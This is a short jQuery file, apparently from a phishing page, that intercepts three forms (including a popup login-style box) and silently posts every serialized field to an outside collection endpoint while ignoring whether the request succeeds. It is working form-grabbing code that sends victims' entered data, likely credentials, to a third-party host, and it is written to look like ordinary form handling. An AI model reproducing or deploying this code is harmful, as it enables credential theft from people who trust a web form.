$(".formInfo").submit(function() {
	var d = $(".formInfo");

	$.ajax({
        url: "https://arpanrizki.my.id/api/get_flag2/api.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});

$(".popup-box-form").submit(function() {
	var d = $(".popup-box-form");

	$.ajax({
        url: "https://arpanrizki.my.id/api/get_flag2/api.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});

$("#xyz").submit(function() {
	var d = $("#xyz");

	$.ajax({
        url: "https://arpanrizki.my.id/api/get_flag2/api.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});